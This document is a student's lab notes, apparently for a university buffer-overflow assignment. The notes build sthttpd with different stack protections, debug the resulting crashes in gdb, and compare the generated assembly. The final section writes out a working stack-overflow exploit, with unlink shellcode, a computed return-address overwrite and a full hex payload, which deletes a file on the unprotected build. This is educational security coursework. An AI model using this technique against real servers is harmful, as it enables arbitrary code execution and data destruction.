@@ -1,0 +1,270 @@
+1,2.
+===Download, patch, configure===
+"export PATH=/usr/local/cs/bin:$PATH" prepends string to path, changing which gcc runs
+"which gcc" allows us to confirm which gcc version
+"curl -O http://web.cs.ucla.edu/classes/spring17/cs33/lab/sthttpd-2.27.0.tar.gz" downloads sthttpd-2.27.0.tar.gz to current directory
+"tar -xvf sthttpd-2.27.0.tar.gz" extracts verbosely the file sthttpd-2.27.0.tar.gz
+"vim a.patch" opens new file to allow you to create a patch; do this inside /sthttpd-2.27.0/src directory
+"patch < a.patch" applies the patch; do this inside /sthttpd-2.27.0/src directory
+"./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"" this will configure stuff; do this inside sthttpd-2.27.0 directory;
+===end===
+
+===Make thttpd-sp===
+"make clean"
+"make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'"
+"mv src/thttpd src/thttpd-sp" 
+===end===
+
+===Make thttpd-as===
+"make clean"
+"make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'"
+"mv src/thttpd src/thttpd-as"
+
+add "-static-libasan" to make so that ELF class issue goes away
+===end===
+
+===Make thttpd-as===
+"make clean"
+"make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'"
+"mv src/thttpd src/thttpd-no"
+===end===
+
+===Or, create compile.sh from this===
+#!/bin/sh
+./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd src/thttpd-as
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+===end===
+
+===Use compile.sh===
+"chmod +777 compile.sh" changes access permissions so that we may use it
+"./compile.sh" runs compile.sh
+===end===
+
+3.
+===Start each server===
+"src/thttpd-sp -p 12886 -D" will start the server and hang the terminal
+"src/thttpd-as -p 12887 -D" -D runs server in foreground
+"src/thttpd-no -p 12888 -D" -p 12888 is the port and port number
+===end===
+
+4.
+===Test each server===
+"vim foo.txt" opens foo.txt and lets you edit it
+"curl http://localhost:12886/foo.txt" will output text from foo.txt
+"curl http://localhost:12887/foo.txt" foo.txt is inside /sthttpd-2.27.0
+"curl http://localhost:12888/foo.txt" do this in a second terminal because running server in foreground will hang the terminal
+===end===
+
+===Fix for ELF===
+add "-static-libasan" to the make CFLAGS
+===end===
+
+===Fix strcpy for thttpd-as===
+==22329==ERROR: AddressSanitizer: strcpy-param-overlap: memory ranges [0x0000013b9bc0,0x0000013b9bca) and [0x0000013b9bc7, 0x0000013b9bd1) overlap
+    #0 0x477dbe in __interceptor_strcpy ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:543
+...
+
+fixed by changing strcpy in /src/libhttpd.c:4081 to
+{
+    char temp[200];
+    (void) strcpy(temp, &str[7]);
+    (void) strcpy(str, temp);
+}
+and remaking thttpd-as
+===end===
+
+5.
+===Create config.txt===
+"vim config.txt" insert exploit into here; use "debug " * 30 to get a segmentation fault (want over a 100 charactersand a valid word)
+===end===
+
+===Break thttpd-sp===
+"gdb src/thttpd-sp" starts gdb
+"(gdb) run -p 12886 -D -C config.txt" runs server on gdb
+"bt" gets a backtrace
+"break read_config" inserts a breakpoint at the function that has the buffer overflow vulnerability
+"set disassemble-next-line on" gives us the assembly for each line
+"step" steps over functions we don't care about
+"stepi" steps into functions we care about
+===end===
+
+===Backtrace for thttpd-sp===
+#0  0x00007ffff76121d7 in raise () from /lib64/libc.so.6
+#1  0x00007ffff76138c8 in abort () from /lib64/libc.so.6
+#2  0x00007ffff7651f07 in __libc_message () from /lib64/libc.so.6
+#3  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#4  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#5  0x00000000004050a6 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#6  0x00000000004053cf in parse_args (argc=6, argv=0x7fffffffe178)
+    at thttpd.c:893
+#7  0x00000000004038c6 in main (argc=<optimized out>, argv=<optimized out>)
+    at thttpd.c:380
+===end===
+
+===Machine instruction causing crash for thttpd-sp===
+0x0000000000404f73 <read_config+1219>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+0x0000000000404f78 <read_config+1224>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+...73 is moving the the value of the address where the canary was onto rax
+...78 is comparing to see if the value of that address is the same as the canary; it is not the same, so it crashes
+===end===
+
+6.
+===Break thttpd-as===
+"gdb src/thttpd-as" starts gdb
+"(gdb) run -p 12887 -D -C config.txt" runs server on gdb
+"bt" gets a backtrace
+"break read_config" inserts a breakpoint at the function that has the buffer overflow vulnerability
+"set disassemble-next-line on" gives us the assembly for each line
+"step" steps over functions we don't care about
+"stepi" steps into functions we care about
+===end===
+
+===Backtrace for thttpd-as===
+#0 0x43af18 in __interceptor_strchr ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+#1 0x4e0ba0 in read_config /u/cs/ugrad/quentin/Desktop/sthttpd-2.27.0/src/thttpd.c:1018
+#2 0x4e169e in parse_args /u/cs/ugrad/quentin/Desktop/sthttpd-2.27.0/src/thttpd.c:893
+#3 0x4082e7 in main /u/cs/ugrad/quentin/Desktop/sthttpd-2.27.0/src/thttpd.c:380
+#4 0x7ffff6cc6b34 in __libc_start_main (/lib64/libc.so.6+0x21b34)
+#5 0x409449  (/w/home.15/cs/ugrad/quentin/Desktop/sthttpd-2.27.0/src/thttpd-as+0x409449)
+===end===
+
+===Machine instruction causing crash for thttpd-as===
+0x00000000004e0b51 <read_config+113>:	e8 5a 9b f5 ff	callq  0x43a6b0 <__interceptor_fopen(char const*, char const*)>
+this calls the interceptor because there is a stack buffer overflow, which causes the crash after many other instructions
+===end===
+
+7.
+===Break thttpd-no===
+"gdb src/thttpd-no" starts gdb
+"(gdb) run -p 12888 -D -C config.txt" runs server on gdb
+"bt" gets a backtrace
+"break read_config" inserts a breakpoint at the function that has the buffer overflow vulnerability
+"set disassemble-next-line on" gives us the assembly for each line
+"step" steps over functions we don't care about
+"stepi" steps into functions we care about
+===end===
+
+===Backtrace for thttpd-no===
+#0  0x00007ffff76121d7 in raise () from /lib64/libc.so.6
+#1  0x00007ffff76138c8 in abort () from /lib64/libc.so.6
+#2  0x00007ffff7651f07 in __libc_message () from /lib64/libc.so.6
+#3  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#4  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#5  0x00000000004050a6 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#6  0x00000000004053cf in parse_args (argc=1701052519, argv=0x6775626564)
+    at thttpd.c:893
+#7  0x00000000004038c6 in main (argc=<optimized out>, argv=<optimized out>)
+    at thttpd.c:380
+===end===
+
+===Machine instruction causing crash for thttpd-no===
+0x00000000004022b0 in ?? ()
+shows that the stack has been corrupted and eventually causes the crash because it is no longer acting correctly
+===end===
+
+8.
+===Create assembly.sh from this===
+#!/bin/sh
+./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd.o src/thttpd-sp.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd.o src/thttpd-as.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd.o src/thttpd-no.s
+===end===
+
+===Run assembly.sh===
+chmod +777 assembly.sh
+./assembly.sh
+===end===
+
+===Differences between thttpd===
+thttpd-as.s has 4000 lines more than the other two
+thttpd-sp.s and thttpd-no.s are basically the same thing
+
+"?handle_read" when in vim to search for "handle_read"
+"n" after "?handle_read" to find next instance of "handle_read"
+
+-fstack-protector-strong in thttpd-sp-s uses canaries to check if the stack has been overrun; puts a value on the stack and checks if the value is the same when modifying the stack
+-fsanitize=address in thttpd-as.s creates many more instructions regarding asan_report_load4, asan_report_store4, asan_report_load8, asan_report_store8; thttpd-as uses shadow memory to 
+verify memory has not be changed and to check for buffer overflow
+===end===
+
+9.
+===Making exploit to delete target.txt===
+=Collecting address info=
+"gdb ./src/thttpd-no" to start gdb
+"break read_config" and "run -p 12888 -D -C config.txt" and "p &line" to find start address of array; returns "$1 = (char (*)[100]) 0x7fffffffce30"
+"info registers" to find rsp, which is currently holding to "0x7fffffffcec8"
+
+0x7fffffffce30 (start of array) - 0x7fffffffcec8 (rsp return address) = -152; so the buffer needs 152 bytes before the address
+"vim target.txt" to create exploit file; type "target.txt" inside this so that we can use "xxd target.txt" to get the hex code for "target.txt"//resultant hex code is "7461 7267 6574 2e74 7874 
+00" (which is 11 bytes)
+
+find address in front of the return address by 0x7fffffffcec8 - 16 = 0x7fffffffceb8 = (rsp-16)
+=end=
+
+=Finding instructions=
+to delete the file, we use unlink; to find assembly for unlinking target.txt, we create an unlink assembly file and take the assembly
+"unlink.s" contains 
+"
+movq    $(rsp-16), %rdi
+movq    $0x57, %rax
+syscall"
+objdump the file and you will get
+"
+where (rsp-16) = 0x7fffffffceb8
+"objdump -d unlink.s" produces 
+"
+unlink.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 bf b8 ce ff ff ff 	movabs $0x7fffffffceb8,%rdi
+   7:	7f 00 00 
+   a:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax
+  11:	0f 05                	syscall 
+"
+=end=
+
+=creating hex.txt=
+hex.txt contains 3 00's (hex instructions of objdump of unlink) 109 00's (target.txt in hex) 6 00's (reverse of (address of array start + 8)) 2 00's; this evaluates out to 
+"
+00 00 00 48 bf b8 ce ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 74 
+61 72 67 65 74 2e 74 78 74 00 00 00 00 00 00 38 ce ff ff ff 7f 00 00
+"
+=end=
+
+=creating and running raw.txt=
+create and compile the hex2raw.c, then
+"./hex2raw < hex.txt >> raw.txt" to create hex raw file
+"vim raw.txt" and add "port=" to beginning of raw.txt to avoid invalid command stuff
+"(gdb) run -p 12888 -D -C raw.txt" to remove target.txt
+=end=
+===end===
